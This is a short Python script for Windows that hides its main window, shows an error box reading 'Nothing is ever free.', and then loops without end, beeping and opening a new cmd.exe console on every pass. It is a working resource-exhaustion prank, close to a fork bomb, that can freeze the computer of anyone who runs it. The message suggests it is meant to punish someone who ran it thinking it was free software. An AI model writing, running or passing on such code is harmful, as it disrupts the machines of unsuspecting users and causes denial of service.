import subprocess
import winsound
import time
import tkinter as tk
from tkinter import messagebox

root = tk.Tk()
root.withdraw()  # hide main window

messagebox.showerror(
    title="Error",
    message="Nothing is ever free."
)

while True:
    winsound.Beep(1000,1)
    subprocess.Popen("cmd.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)

root.mainloop()
